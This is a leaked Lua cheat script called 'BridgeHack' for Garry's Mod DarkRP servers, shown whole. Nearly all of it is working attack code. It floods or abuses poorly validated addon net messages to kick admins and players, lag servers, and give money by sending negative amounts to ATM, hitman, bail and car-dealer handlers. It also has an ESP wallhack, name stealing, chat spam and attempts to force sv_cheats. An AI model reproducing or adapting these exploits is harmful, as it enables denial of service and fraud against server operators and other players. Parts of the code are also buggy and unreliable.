chat.AddText(Color(255,0,0),[[
	Leaked by Velkon
	Help from dex and hex.
	Enjoy, And scriptfodder guys: Fix ur scripts plz
	]])
local dversion=1.0 -- This is useless because the version check is fucked. :/
local dlversion ="v1.0"

local ulx_spam=0 // Global variable ( not needed yet.)-------------------------------------------
// INSTALIZATION 
// FUNCTIONS

function clearcon()
        for i=0, 100 do
        print(" ")
		end
end

function cleardchat()
  for i=0, 100 do
    chat.AddText(" ")
  end
end

function chatP(message) 
	queries = queries + 1
	chat.AddText(Color(120, 255, 0), "[BridgeHack " .. dlversion .. "]: ", Color(255,255,0), message)
	--status(message)
end
	queries=1;	
	http.Fetch("http://pastebin.com/raw.php?i=jfuCra2J",function(body, len, headers, code)
		serverlist = body
	end,function( error )
		chatP("Cant access server..")
	end)

	
--[[
				Version Check
 --]]    
	http.Fetch("http://pastebin.com/raw.php?i=xcTwfJY7",function( HTML ) 
			local findpos = string.find( HTML, "CVERSION =", 0, false )	
			if (findpos) then
				local version = tonumber( string.sub( HTML, findpos+10, findpos+13 ) )
				if ( version > dversion ) then
					chatP("Your version is out of date!" )
					 latestversion = HTML
					VersionMenu()
				else
					chatP("Your version is up to date." )
				end
			end
		end)
	
	/////////////////////////////////////////
	
	
--																Outdated Version Menu

	function VersionMenu()
		local Panel = vgui.Create( "DFrame" );
		Panel:SetSize( 800, 600 );
		Panel:SetPos( ScrW()/2-Panel:GetWide()/2, ScrH()/2-Panel:GetTall()/2 );
		Panel:SetTitle( "BridgeHack - Notice" );
		Panel:MakePopup();
		
		local Label = vgui.Create( "DLabel", Panel );
		Label:SetColor( Color( 255, 255, 255, 255 ) );
		Label:SetFont( "DermaLarge" );
		Label:SetText( "Your version " ..dlversion.." is outdated!" );
		Label:SizeToContents();
		Label:SetPos( Label:GetParent():GetWide()/2-Label:GetWide()/2-5, 50 );
		Label.Paint = function()
			Label:SetColor( Color( 255, 255 - (math.sin( CurTime() * 4 ) * 255), 255 - (math.sin( CurTime() * 4 ) * 255), 255 ) );
		end
		
		local HTML = vgui.Create( "HTML", Panel );
		HTML:OpenURL( "http://pastebin.com/raw.php?i=Ax9WQ5y7" );
		HTML:SetSize( HTML:GetParent():GetWide() - 50, HTML:GetParent():GetTall() - 160 );
		HTML:SetPos( 25, 100 )
		HTML.Paint = function()
			surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
			surface.DrawRect( 0, 0, HTML:GetWide(), HTML:GetTall() );
		end
	end
	
	local randomvar = math.Rand(0,9999999)
	local BridgeHack = {}
	BridgeHack.RandomVar = randomvar
	local sweg = LocalPlayer():GetEyeTrace().Entity
	local ply = LocalPlayer()
	timer.Destroy("changecolor")
	queries=1;
	function status(statu)--                Made for debugging things.
		queries = queries + 1
		if GetConVarNumber("bhshowhud") == 1 then
			hook.Add( "HUDPaint", "drawcurrent", function()
				surface.SetFont( "BudgetLabel" )
				surface.SetTextColor( 255,255,255 )
				surface.SetTextPos( 25, 25 ) 
				surface.DrawText( "[" .. queries .. " Total Requests] STATUS: " .. statu )
			end)
		end
		
		if GetConVarNumber("bhchat_status") == 1 then
			chat.AddText(Color(231, 76, 60), "[BridgeHack " .. dlversion .. "]: ", Color(255,255,255), statu)
		end
	end
	
	function consoleP(message)
		queries = queries + 1
		MsgC(Color(231, 76, 60), "[BridgeHack " .. dlversion .. "]: ", Color(255,255,255), message, "\n")
		status(message)
	end
	
	function Debug(message) 
		queries = queries + 1
		chat.AddText(Color(155, 89, 182), "[ BridgeHack]: ", Color(255,255,255), message)
	end
	
	local function CreateCvar(cvar, value)
		CreateClientConVar(cvar, value)
		consoleP("CVAR: " .. cvar .. " set to " .. value)
	end
	
	local function ResetCvar(cvar, value)
		ply:ConCommand("" .. cvar .. " " .. value)
		Debug("CVAR: " .. cvar .. " reset to " .. value)
	end
	
	ply:ConCommand("bh_notify 1")
	CreateCvar("bhmenu_effects", 1)
	CreateCvar("bhfirstload_correct", 1)
	CreateCvar("bhchat_status", 0)
	CreateCvar("bhcheats_enabled_on_start", 0)
	CreateCvar("bhcheats_svlua_enabled_on_start", 0)
	CreateCvar("bhshowhud", 0)
	CreateCvar("bhesp",0)
	CreateCvar("bhesp_box",1)
	CreateCvar("bhdebug",1)
	CreateCvar("bhesp_hp",1)
	CreateCvar("bhesp_rank",1)
	CreateCvar("bhrenderdistance_enable",0)
	CreateCvar("bhEsp_rdistance",2000)
	CreateCvar("bhesp_infocolor_r",255)
	CreateCvar("bhesp_infocolor_g",0)
	CreateCvar("bhesp_infocolor_b",255)
	CreateCvar("bhratm_money2give",100000)
	
	if GetConVarNumber("bhfirstload_correct") == 1 then
		Derma_Message( "Welcome " .. ply:Nick() .. ", We see its your first time launching BridgeHack on your SteamID (" .. ply:SteamID() .. ")\nHow do I open the menu?\nSimply do this bind in console bind KEY +bh_menu\nThanks for purchasing BridgeHack, Enjoy\nBridgeHack Hack (HaxRUs)", "Welcome to BridgeHack " .. ply:Nick() .. "!", "Click me to continue" )
		ply:ConCommand("bhfirstload_correct 0")
		chatP("Welcome to the world of BridgeHack.")
	end
	
	if GetConVarNumber("bhcheats_enabled_on_start") == 1 then
		ply:ConCommand("incrementvar sv_cheats 0 1 1")
		status("Enabled sv_cheats to 1")
	end
	if GetConVarNumber("bhcheats_svlua_enabled_on_start") == 1 then
		ply:ConCommand("incrementvar sv_allowcslua 0 1 1")
		status("Enabled sv_allowcslua to 1")
	end
	
	// FIXES 
	local oChatAddText = chat.AddText
	
	function chat.AddText( ... )
		local cArgs = { ... };      
		
		for k, v in pairs( cArgs ) do   
			if (type(v) == 'string' && string.len(v) > 255) then -- 255 should be fine  
				print("BLOCKED STRING CRASH len[" .. string.len(v) .. "]"); 
				return false; 
			end       
		end    
		
		return oChatAddText( ... );
	end
	---------------------------------------// Global timers //---------------------------------------
	if GetConVarNumber("bhshowhud") == 1 then
		hook.Add( "HUDPaint", "drawcursor", function()
			local x, y, c = ScrW() / 2, ScrH() / 2, Color(225, 0, 0, 255) 
			surface.SetDrawColor(c)
			surface.DrawLine(x - 10, y, x - 5, y)
			surface.DrawLine(x, y + 5, x, y + 10)
			surface.DrawLine(x + 10, y, x + 5, y)
		end)
		
		hook.Add( "HUDPaint", "drawabout", function()
			surface.SetFont( "BudgetLabel" )
			surface.SetTextColor( 46, 204, 113 )
			surface.SetTextPos( 25, 15 ) 
			surface.DrawText( "BridgeHack " .. dlversion )
		end)
		
		if GetConVarNumber("bhdebug") > 0 then 
			if system.IsWindows( ) == true then
				hook.Add( "HUDPaint", "drawdev1", function()
					surface.SetFont( "BudgetLabel" )
					surface.SetTextColor( 231, 76, 60 )
					surface.SetTextPos( 25, 47 ) 
					surface.DrawText( "[] Server Operating System: Windows" )
				end)
			end
			
			if system.IsLinux( ) == true then
				hook.Add( "HUDPaint", "drawdev2", function()
					surface.SetFont( "BudgetLabel" )
					surface.SetTextColor( 231, 76, 60 )
					surface.SetTextPos( 25, 47 ) 
					surface.DrawText( "[] Server Operating System: Linux" )
				end)
			end
			
			if system.IsOSX( ) == true then
				hook.Add( "HUDPaint", "drawdev3", function()
					surface.SetFont( "BudgetLabel" )
					surface.SetTextColor( 231, 76, 60 )
					surface.SetTextPos( 25, 47 ) 
					surface.DrawText( "[] Server Operating System: OSX")
				end)
			end
			
			hook.Add( "HUDPaint", "drawdev4", function()
				surface.SetFont( "BudgetLabel" )
				surface.SetTextColor( 231, 76, 60 )
				surface.SetTextPos( 25, 47 ) 
				surface.DrawText( "[] Server Operating System: Windows" )
			end)
			
			hook.Add( "HUDPaint", "drawdev5", function()
				surface.SetFont( "BudgetLabel" )
				surface.SetTextColor( 231, 76, 60 )
				surface.SetTextPos( 25, 57 ) 
				surface.DrawText( "[] Server Location: " .. system.GetCountry( ) .. "" )
			end)
			
			hook.Add( "HUDPaint", "drawdev6", function()
				surface.SetFont( "BudgetLabel" )
				surface.SetTextColor( 231, 76, 60 )
				surface.SetTextPos( 25, 67 ) 
				surface.DrawText( "[] Connection Time: " .. system.AppTime( ) .. " Seconds" )
			end)
			
		end
	end
	
	status("Starting")
	status("BridgeHack Loaded")
	
	for k,v in pairs(player.GetAll()) do
		local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
			consoleP(v:GetUserGroup()..": " .. v:Nick() .. " - " .. v:SteamID() .. " - $" .. playermoney)
		end
	consoleP("BridgeHack, by HaxRUs")
	consoleP(dlversion)
	
	// FUNCTIONS--------------------------------------------69---------------------------------------------------------------------------------
	// CONCOMMANDS------------------------------------------69---------------------------------------------------------------------------------
	
	
	local nlr = CreateClientConVar("bh_nlr_freeze", "0", true, false)
	
	local function nlrs()
		if nlr:GetBool() then
			for k,v in pairs(player.GetAll())do
			if v != LocalPlayer() then
				net.Start("NLR.ActionPlayer")
				net.WriteEntity(v)
				net.SendToServer()
			end
			end
		end
		end
	timer.Create("nlrs", 4,0,nlrs)
	
	LastTime = CurTime()
	
	local checkdanotify = CreateClientConVar("bh_notify","1","true","false")
	function drawdatopscreen()  
	if checkdanotify:GetBool() then
		draw.RoundedBox(0,0,0,ScrW(),21,Color(0,0,0,200))
		sweg = math.Clamp((CurTime()-LastTime)/20,0,1)
	if sweg == 1 then
		LastTime = CurTime()
	end
		draw.DrawText("BridgeHack (By Hax R Us) Loaded! | Any bugs? E-Mail haxrus1337@gmail.com! | Suggestions? We love feedback! E-Mail the Hax R Us team! | ","Trebuchet24",(ScrW() + 600) - sweg*3100 , -2, Color(255,255,255),TEXT_ALIGN_CENTER )
	end
	end
	hook.Add( "HUDPaint", "drawdatopscreen", drawdatopscreen )
	
	concommand.Add("bh_tp_spawn",function()
		chatP("Teleported to spawn!")
		consoleP("Teleported to spawn!")
		status("Teleported to spawn!")
		net.Start("DarkRP_Kun_ForceSpawn")
		net.SendToServer()
	end)
	
	concommand.Add("bh_check",function()
	clearcon()
	cleardchat()
	chatP("Checking for exploitable addons...")
	if dLogs then
	print(" ")
		print(" ")
		chatP("DLOGS | FOUND")
	else
	print(" ")
	print(" ")
		chatP("DLOGS | not FOUND")
	end
	print(" ")
	print(" ")
	if ChanNum then
		chatP("MXRadio| FOUND")
	else
	print(" ")
	print(" ")
		chatP("MXRadio | not FOUND")
	end
	print(" ")
	print(" ")
	if VC_Menu_Info_Panel_Build then
		chatP("VCMD | FOUND")
	else
	print(" ")
		print(" ")
		chatP("VCMD | not FOUND")
	print(" ")
	end
	
	print(" ")
	
	if MDE then
		chatP("MDE | FOUND")
	else
	print(" ")
	print(" ")
		chatP("MDE | not FOUND")
	print(" ")
	end
	
	print(" ")
	if NLR then
		chatP("NLR |  FOUND")
	else
	print(" ")
	print(" ")
		chatP("NLR | not FOUND")
		print(" ")
	end
	end)	
	
	function reloadeddunkalladmins()
	clearcon()
	chatP("KICKING ADMINS..... (THIS WILL INCLUDE ANYONE WHO ISNT A USER!)")
	timer.Create( "heymnangng", 3, 0, function()
	for k,v in ipairs(player.GetAll()) do
	if( v:GetUserGroup() != "user" ) then
	if v:Nick() != "Gam" then
	for i=0, 700 do
	net.Start( "GetCar" )
	net.WriteEntity(v)
	net.WriteEntity(v)
	net.SendToServer()
	end
	chatP('Kicked: '.. v:Nick().. "!")
	end
	end
	end
	end)
	end
	concommand.Add( "bh_mx_kickadmins", reloadeddunkalladmins )
	
	function dloglag()
	clearcon()
	print("Lagging server.")
	clearcon()
	print("Lagging server..")
	clearcon()
	print("Lagging server...")
	timer.Create( "dlogsisfucked", 3, 0, function()
	for i=0, 700 do
	local tosend = {
		cmd="+forward",
		args=" "
		
		}
		net.Start('dLogsGetCommand')
		net.WriteTable(tosend)
		net.SendToServer()
	end
	end)
	end
	
	concommand.Add( "bh_dlogs_lag", dloglag )
	concommand.Add( "bh_dlogs_lag_off", function()
		clearcon()
		print("Stopping the lag...")
		timer.Destroy("dlogisfucked")
	end)
	
	concommand.Add("bh_admins", function()
	clearcon()
	chatP("Listing non-players..")
	chatP("Check console.")
	consoleP("=============ULX | Custom admin mode RANKS ============")
	for k,v in pairs(player.GetAll()) do
			if( v:GetUserGroup() != "user" ) then
					print(v:Nick().. " | ".. v:GetUserGroup())
			end
	end
	consoleP("=======================================================")
	end)
	
	local Spammer = CreateClientConVar("bh_advert", "0", true, false)
 
	local function Spam()
		if Spammer:GetBool() then
			RunConsoleCommand("say", "/advert I AM TOO COOL FOR SCHOOL !!!!!!") --Whatever you want
		end
	end
	timer.Create("Spam", 1.5,0,Spam)
	
	local player2kick = CreateClientConVar("g_mx_playername", " ", true, false)
	function kickdaplayer()
	timer.Create( "heymnangng2", 3, 0, function()
	for k,v in ipairs(player.GetAll()) do
	if v:Nick() == GetConVar("g_mx_playername") then
	clearcon()
	print("Kicking: ")
	print(v:Nick())
	for i=0, 700 do
	net.Start( "GetCar" )
	net.WriteEntity(v)
	net.WriteEntity(v)
	net.SendToServer()
	end
	chatP("Kicked ".. v:Nick())
	consoleP("Kicked ".. v:Nick())
	end
	end
	end)
	end
	concommand.Add( "bh_mx_kickplayer", kickdaplayer )
	
	concommand.Add("Bh_clearcon",function()
		clearcon()
	end)
	
	concommand.Add("Bh_clearchat",function()
		cleardchat()
	end)

	
	concommand.Add("bh_3dcardealer_spamstore",function()
		chatP("You better be looking at a car")
	for i=0,100 do
	clearcon()
	chatP("Spamming store... ".."["..i.."]")
	net.Start( "RXCAR_Shop_Store_C2S" )
		net.WriteTable({E=sweg})
		net.SendToServer()
	end
	end)

	concommand.Add("bhserverlist",function()
		status("Printing lise to console...")
		chatP("Check console.")
		clearcon()
		consoleP(""..serverlist.."")
		status("Complete")
	end)
	
	if requestTables then
	print("ae found, bh_ae will work")
	chatP("AE was found, bh_ae will work.")
	else
	chatP("AE was not found, bh_ae will not work.")
	end
	
	concommand.Add("bhae_kickadmins",function()
	clearcon()
	chatP("Attempting to Kick admins")
	chatP("This will only work on admins+")
	timer.Create( "aekickdaskids", 3, 0, function()
	for k,v in ipairs(player.GetAll()) do
	if( v:GetUserGroup() != "user" ) then
	if( v:GetUserGroup() != "vip" ) then
	for i=0, 1000 do
	net.Start('plyWarning')
			net.WriteEntity(v)
			net.WriteString('You have to select a player before doing a action.')
			net.SendToServer()
	end
	chatP('Attempting to kick: '.. v:Nick().. "!")
	end
	end
	end
	end)
	end)
	
	concommand.Add("bhtp_spawn",function()
	print(" Teleported to spawn! ")
	chat.AddText("Teleported to spawn!")
	net.Start("DarkRP_Kun_ForceSpawn")
		net.SendToServer()
    end)
	concommand.Add("bhnamesteal_on",function()
		status("Running Script: Random Name Change [name steal]....")
		
		timer.Create("startNAMECHANGEsteal", 0.12, 0, function()
			local plylastname = ply:Nick()
			for k,v in pairs(player.GetAll()) do
				local ligger_type = math.random(1,2)
				local ligger_type1 = math.random(1,2)
				status("Trying Name change to " .. v:Nick() .. " - " .. v:SteamID())
				if ligger_type1 == ligger_type then
					status("Name Changing to " .. v:Nick() .. " - " .. v:SteamID())
					
					if plylastname == v:Nick() then
						local ligger_type = math.random(1,2)
						local ligger_type1 = math.random(1,2)
					else
						ply:ConCommand("darkrp name " .. v:Nick() .. math.random(1,10))
						status("Changed Name to " .. v:Nick() .. " - " .. v:SteamID())
					end
					
					local ligger_type = math.random(1,2)
					local ligger_type1 = math.random(1,2)
				end
			end
		end)
	end)
	
	concommand.Add("bhnamesteal_off",function()
		timer.Destroy("startNAMECHANGEsteal",0.12,0,function()
		
		end)
	end)
	
	concommand.Add("bhremovelookingat",function()
		chatP("Removing prop looking at...")
		net.Start( "MDE_RemoveStuff_C2S" )      
			net.WriteTable( {DATA="",TARGET=sweg} )    
		net.SendToServer()
	end)
	
	concommand.Add("__BridgeHacklagdarkrpdashit",function()
		chatP("Starting the lag...")
		timer.Create("lag"..BridgeHack.RandomVar, 1, 0, function()
			for i=1,10000 do
				net.Start("DarkRP_spawnPocket")
				net.SendToServer()
			end
			status("PROGRESS[10000/10000]")
		end)
	end)
	
	concommand.Add( "__BridgeHackstopplag",function(  )
		chatP("Stopping the lag...")
		timer.Destroy("lag"..BridgeHack.RandomVar)
	end)
	
	if dspam == true then
		chatP("Spam split / make shipment ON")
		timer.Create("spamdashit"..BridgeHack.RandomVar,0.1,function()
			for k,v in pairs(ents.GetAll()) do 
				if v.Entity:GetString() == "spawned_shipment" then 
					status("Splitting shipment") 
					RunConsoleCommand("darkrp","splitshipment",v.Entity:EntIndex())
				elseif v.Entity:GetClassName() == "spawned_weapon" then 
					status("Making shipment")
					RunConsoleCommand("darkrp","makeshipment",v.Entity:EntIndex())
				end
			end
		end)
	end
	
	if dspam == false then 
		chatP("Spam split / make shipment OFF")
		timer.Simple(1,function()
			timer.Destroy("spamdashit"..BridgeHack.RandomVar,function()
			
			end)
		end)
	end
	
	concommand.Add("bhkun_ziptie_untie",function()
		chatP("Untieing...")
		for i=0,30 do 
			net.Start("Kun_ZiptieStruggle")
			net.SendToServer()
		end
	end)
	
	concommand.Add("___darkrpshipments", function()
		if dspam != true then
			dspam = true
		elseif dspam == true then
			dspam = false
		end
	end)
	
	local function BridgeHackCHECK(v) 
		if v:Alive() == true && v:Health() ~= 0 && v:Health() >= 0 && v ~= LocalPlayer() && LocalPlayer():Alive() then
			return true
		else
			return false
		end
	end
	
	hook.Add("HUDPaint", "JESP", function() 
		for k,v in pairs(player.GetAll()) do
			if GetConVarNumber("bhesp") > 0 then
				if(v ~= LocalPlayer() and BridgeHackCHECK(v)) then
					if GetConVarNumber("bhrenderdistance_enable") > 0 then
						if LocalPlayer():GetPos():Distance(v:GetPos()) < GetConVarNumber("bhesp_rdistance") then
							local PlayerESP = (v:EyePos()):ToScreen()
							local infocolor = Color(GetConVarNumber("bhesp_infocolor_r"),GetConVarNumber("bhesp_infocolor_g"),GetConVarNumber("bhesp_infocolor_b"))
							local infocolor = Color(GetConVarNumber("bhesp_infocolor_r"),GetConVarNumber("bhesp_infocolor_g"),GetConVarNumber("bhesp_infocolor_b"))
							
							draw.DrawText(v:Name(), "BudgetLabel", PlayerESP.x, PlayerESP.y -46, team.GetColor(v:Team()), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
							
							if GetConVarNumber("bhesp_rank") > 0 then 
								draw.DrawText(v:GetUserGroup(), "BudgetLabel", PlayerESP.x, PlayerESP.y -23, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
							end
							
							if GetConVarNumber("bhesp_hp") > 0 then
								local infocolor = Color(255,0,255)
								draw.DrawText(v:Health() .. " HP", "BudgetLabel", PlayerESP.x, PlayerESP.y -34, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
							end
								
							local col = team.GetColor(v:Team()) -- looped into esp (square box)     
							local min, max = v:WorldSpaceAABB()
							
							min, max = min:ToScreen(), max:ToScreen()
							
							local h = (min.y / 2) - (max.y / 2)
							surface.SetDrawColor(col.g, col.b, col.r)
							
							if GetConVarNumber("bhesp_box") > 0 then 
								surface.DrawOutlinedRect(max.x +h/10, max.y + (min.y / 75), h, h)
								surface.DrawOutlinedRect(max.x +h/10-.5, max.y + (min.y / 75)-.5, h+1, h+1)
								surface.DrawOutlinedRect(max.x +h/10-1, max.y + (min.y / 75)-1, h+2, h+2)
							end
						end
					else 
					
					local PlayerESP = (v:EyePos()):ToScreen()
					local infocolor = Color(0,255,0)
					local infocolor = Color(GetConVarNumber("bhesp_infocolor_r"),GetConVarNumber("bhesp_infocolor_g"),GetConVarNumber("bhesp_infocolor_b"))
					draw.DrawText(v:Name(), "BudgetLabel", PlayerESP.x, PlayerESP.y -46, team.GetColor(v:Team()), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
					
					if GetConVarNumber("bhesp_rank") > 0 then
						draw.DrawText(v:GetUserGroup(), "BudgetLabel", PlayerESP.x, PlayerESP.y -23, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
					end
					
					if GetConVarNumber("bhesp_hp") > 0 then
						local infocolor = Color(GetConVarNumber("bhesp_infocolor_r"),GetConVarNumber("bhesp_infocolor_g"),GetConVarNumber("bhesp_infocolor_b"))
						draw.DrawText(v:Health() .. " HP", "BudgetLabel", PlayerESP.x, PlayerESP.y -34, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
					end
					
					local col = team.GetColor(v:Team()) -- looped into esp (square box)     
					
					local min, max = v:WorldSpaceAABB()
					min, max = min:ToScreen(), max:ToScreen()
					local h = (min.y / 2) - (max.y / 2)
					
					surface.SetDrawColor(col.g, col.b, col.r)
					
					if GetConVarNumber("bhesp_box") > 0 then 
						surface.DrawOutlinedRect(max.x +h/10, max.y + (min.y / 75), h, h)
						surface.DrawOutlinedRect(max.x +h/10-.5, max.y + (min.y / 75)-.5, h+1, h+1)
						surface.DrawOutlinedRect(max.x +h/10-1, max.y + (min.y / 75)-1, h+2, h+2)
					end
				end
			end
		end
	end
end)

function blur_on()
	DrawMaterialOverlay( "Models/effects/comball_tape", 0.5 )
end 

function blur_off()
	DrawMaterialOverlay( "", 0.1 )
end

concommand.Add("+bh_menu", function( ply ) 
	status("Menu Opened.")
	if GetConVarNumber("bhmenu_effects") == 1 then
		hook.Add( "RenderScreenspaceEffects", "BlurBG", blur_on )
	end
--[[
	
	THE MAIN
	
	
	MENU
	
	
	
	STARTS
	
	
	
	HERE
	
	|
	V
]]--
	local menu = DermaMenu() 
	menu:Center()
	menu:AddOption( "BridgeHack " .. dlversion, function() 
		Derma_Message("BridgeHack\nMenu by HaxRUs", "BridgeHack " .. dlversion .. "", "Okay")
	end ):SetImage( "icon16/shield.png" )
	menu:AddSpacer()
	
	local ForcingMenu, optMenu = menu:AddSubMenu("Client-side Forcing")
	
	ForcingMenu:AddOption( "Force sv_allowcslua 1", function() 
		ply:ConCommand("incrementvar sv_allowcslua 0 1 1")
		status("Forced SV_ALLOWCSLUA TO 1")
	end):SetImage( "icon16/link_error.png" )
	
	ForcingMenu:AddOption( "Force sv_cheats 1", function() 
		ply:ConCommand("incrementvar sv_cheats 0 1 1")
		status("Forced SV_CHEATS TO 1")
	end):SetImage( "icon16/link_error.png" )
	
	local ESP = menu:AddSubMenu("ESP")
	
	ESP:AddOption( "[ON] ESP", ESP_on):SetImage( "icon16/group_add.png" )
	ESP:AddOption( "[OFF] ESP", ESP_off):SetImage( "icon16/group_delete.png" )
	
	local Speed = menu:AddSubMenu("Speed")
	Speed:AddOption( "[ON] SpeedHack", speedhack_on):SetImage( "icon16/lightning_go.png" )
	Speed:AddOption( "[OFF] SpeedHack", speedhack_off):SetImage( "icon16/lightning_delete.png" )
	
	
	local NameStealSub = menu:AddSubMenu( "Name Stealing/Changing" )
	NameStealSub:AddOption( "[ON] Name Steal", function()
		ply:ConCommand("bhnamesteal_on")
	end ):SetImage( "icon16/book_addresses.png" )
	
	NameStealSub:AddOption( "[OFF] Name Steal", function()
		status("Stopped Script: Random Name Change [name steal]")
		ply:ConCommand("bhnamesteal_off")end ):SetImage( "icon16/book.png" )
		
		local DARKRPBASEDSUB = menu:AddSubMenu( "DarkRP Minging/Scripts" )
		
		DARKRPBASEDSUB:AddOption("[NLR] TP Spawn",function()
			ply:ConCommand("bh_tp_spawn")
		end):SetImage( "icon16/cake.png" )
		
		DARKRPBASEDSUB:AddOption("[ON] Advert Spam",function()
			ply:ConCommand("bh_advert 1")
		end):SetImage( "icon16/bell_add.png" )
		
		DARKRPBASEDSUB:AddOption("[OFF] Advert Spam",function()
			ply:ConCommand("bh_advert 0")
		end):SetImage( "icon16/bell_delete.png" )
		
		DARKRPBASEDSUB:AddOption("Remove looking at prop",function()
			timer.Simple(0.1,function()
				chatP("(This can be binded to: bhremovelookingat)")
				ply:ConCommand("bhremovelookingat")
			end)
		end):SetImage("icon16/map_delete.png")
		
		DARKRPBASEDSUB:AddOption( "[$$] SS Shelf NET",function() 
			chatP("Attempting to give money..")
			for k,v in pairs(ents.GetAll()) do 
				swag = v 
			end
			net.Start( 'NET_SS_DoBuyTakeoff' )          
				net.WriteEntity(LocalPlayer())          
				net.WriteEntity(swag)          
				net.WriteTable({'spawned_weapon'})          
				net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)       
				net.SendToServer()   
		end):SetImage( "icon16/coins_add.png" )
		
		DARKRPBASEDSUB:AddOption( "[$$] HITMAN MONEY",function() 
			chatP("Attempting to give money..")
			net.Start( "DaHit" )
				net.WriteFloat( -1000000000000000000000 )
				--net.WriteFloat( tm )
				net.WriteEntity( LocalPlayer() )
				net.WriteEntity( LocalPlayer() )
				net.WriteEntity( LocalPlayer() )
			net.SendToServer()
		end):SetImage( "icon16/coins_add.png" )
			
		DARKRPBASEDSUB:AddOption( "[$$] HHH MONEY",function()
			local ply = LocalPlayer()
			for k,v in pairs(player.GetAll()) do  
				dahater = v
			end
			
			local hitRequest = {}
			hitRequest.hitman = ply
			hitRequest.requester = ply
			hitRequest.target = dahater
			hitRequest.reward = 100000000
			
			net.Start( 'hhh_request' )
				net.WriteTable( hitRequest )
			net.SendToServer()
			
		end):SetImage( "icon16/coins_add.png" )
		
		DARKRPBASEDSUB:AddOption("[$$] BOONPC",function()
			net.Start('BuyCar')
			net.WriteFloat(-1000000000000)
			net.WriteEntity(LocalPlayer())
			net.WriteString("BridgeHack best cheat na")
			net.WriteString("BridgeHack best cheat na")
			net.WriteString("BridgeHack best cheat na")
			net.SendToServer()
		end):SetImage( "icon16/coins_add.png" )
		
		DARKRPBASEDSUB:AddOption( "[$$] HITMENU",function()
			chatP("Giving money..")
			chatP("Note: Doing this more than once will arouse suspicion.")
				net.Start("hitcomplete")
				net.WriteDouble(10000000000)
				net.SendToServer()
			end):SetImage( "icon16/coins_add.png" )   

		DARKRPBASEDSUB:AddOption( "[$$] VCMOD Sell-car",function() 
			chatP("Attempting to give money..")  
			for i=0,30 do  
				for i=1,10 do 
					net.Start( "AttemptSellCar" )    
					net.WriteInt(  i, 8 ) 
					net.SendToServer()
				end
			end
		end):SetImage( "icon16/coins_add.png" )   

		DARKRPBASEDSUB:AddOption( "[$$] BAILNPC",function() 
			chatP("Attempting to give money..")
				net.Start( "BailOut" )
				net.WriteEntity( ply )
				net.WriteEntity( ply )
				net.WriteFloat( -10000000)
				net.SendToServer()
		end):SetImage( "icon16/coins_add.png" )
		
		DARKRPBASEDSUB:AddOption("[$$] REALISTIC ATM",function()
			local DermaPanel = vgui.Create( "DFrame" )
			DermaPanel:SetPos( 100, 100 )
			DermaPanel:SetSize( 300, 200 )
			DermaPanel:SetTitle( " " )
			DermaPanel:SetVisible( true )
			DermaPanel:SetDraggable( true )
			DermaPanel:ShowCloseButton( true )
			DermaPanel.Paint = function()
				draw.RoundedBox(0,0,0,600,2000,Color(200,0,0,200))
				draw.RoundedBox(0,0,0,300,25,Color(0,0,0,255))
				draw.DrawText("Realistic ATM BridgeHack Exploit","DermaDefaultBold",8,5,Color(150,150,150,255))
			end
			DermaPanel:MakePopup()
			
			local TextEntry = vgui.Create( "DTextEntry", DermaPanel )-- create the form as a child of frame
			TextEntry:SetPos( 75, 75 )
			TextEntry:SetSize( 150, 25 )
			TextEntry:SetText( "Account num(Including the -!)" )
			
			local BDButton = vgui.Create( "DButton",DermaPanel )
			BDButton:SetPos( 10, 25 )
			BDButton:SetText( "Tutorial!" )
			BDButton:SetSize( 280, 50 )
			BDButton.DoClick = function()
				Derma_Message( "How to give yourself money!\nStep 1: Goto your nearest ATM.\nStep 2: Make an account (REMEMBER THE ACCOUNT NUMBER!!)\nStep 3: Open up the realistic atm exploit menu found in BridgeHack\nStep 4: Enter your account number (Including the -)\nStep 5: Slide/enter the desired ammount\nStep 6: Hit GIVE!!!!\nThanks for using BridgeHack!", "Realistic Atm Money Tutorial!", "Thanks!")
			end
			
			local BBDButton = vgui.Create( "DButton",DermaPanel )
			BBDButton:SetPos( 10, 120 )
			BBDButton:SetText( "GIVE!" )
			BBDButton:SetSize( 280, 75 )
			BBDButton.DoClick = function()
				local accnumber = TextEntry:GetValue()
				local moneytogive = GetConVarNumber("bhratm_money2give")
				chatP("Attempting to give "..moneytogive.."$ on Account Number: "..accnumber)
				net.Start("ATM_DepositMoney_C2S")
					net.WriteTable({Memo =BridgeHack.RandomVar,Num=accnumber,Amount=-moneytogive})
				net.SendToServer()
			end
			
			local RenderDistance = vgui.Create( "DNumSlider", DermaPanel )
			RenderDistance:SetPos( 10, 100) // Set the position
			RenderDistance:SetSize( 275, 25 ) // Set the size
			RenderDistance:SetText( "Money to give" ) // Set the text above the slider
			RenderDistance:SetMin( 0 ) // Set the minimum number you can slide to
			RenderDistance:SetMax( 500000 )// Set the maximum number you can slide to
			RenderDistance:SetDecimals( 1 ) // Decimal places - zero for whole number
			RenderDistance:SetConVar( "bhratm_money2give" ) // Changes the ConVar when you slide
		end):SetImage("icon16/coins_add.png")
		
		DARKRPBASEDSUB:AddOption( "[$$] TOW TRUCK DRIVER",function() 
			chatP("Giving money..")
			for k,v in pairs(ents.GetAll()) do 
				status("Attempting to make fine") 
				net.Start("TOW_SubmitWarning")
					net.WriteString(LocalPlayer():SteamID())
					net.WriteDouble(-1000000)
					net.WriteEntity(v)
					net.SendToServer()
					
					net.Start("TOW_PayTheFine")
						net.WriteEntity(v)
					net.SendToServer()
			end
		end):SetImage( "icon16/coins_add.png" )
		
		DARKRPBASEDSUB:AddOption( "[X] KUN ZIPTIES UNTIE SELF ",function() 
			ply:ConCommand("bhkun_ziptie_untie")
		end):SetImage( "icon16/cut.png" )    
		
		DARKRPBASEDSUB:AddOption( "Open Armory", function()     
			chatP("Opening armory..")    
			ARMORY_WeaponMenu()     
		end):SetImage( "icon16/bomb.png" )
		
		DARKRPBASEDSUB:AddOption( "[ON/OFF] Spam Split Shipment / Make Shipemnt", function()
			ply:ConCommand("___darkrpshipments")
		end):SetImage( "icon16/cut_red.png" )
		
